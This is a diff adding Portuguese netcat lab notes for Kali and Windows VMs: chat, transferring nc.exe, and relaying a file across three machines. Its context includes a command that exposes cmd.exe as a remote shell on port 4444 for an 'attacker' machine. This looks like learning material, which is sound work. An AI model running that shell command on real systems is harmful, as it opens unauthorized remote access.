@@ -55,8 +55,32 @@ md5sum senha.txt
 python3 -m http.server 1234
 nc -nv 192.168.1.30 4444
 
+
 - Abrir uma porta no lado do cliente para executar o nc.exe e conectar à máquina do atacante:
 nc.exe -nvlp 4444 -e cmd.exe
 
 Certifique-se de adaptar os endereços IP e portas conforme necessário para sua configuração.
+
+### Comandos
+
+- Criação de chat simples (servidor e cliente precisam estar na mesma rede):
+nc -lvp 1234
+nc -v 192.168.1.10 1234
+
+- Transferir o nc.exe para uma VM Windows:
+python3 -m http.server 1234
+nc -nv 192.168.1.30 4444
+
+### Enviar Arquivo entre Três Máquinas
+
+Kali > VM01 > VM02
+
+- No Kali, executar o seguinte comando no arquivo desejado:,
+nc -l -p 1234 > video.avi
+
+- Na VM01, receber o arquivo da máquina Kali e disponibilizar para a VM02:
+nc -v 192.168.1.10 1234 | nc -l -p 4321
+
+
+
 
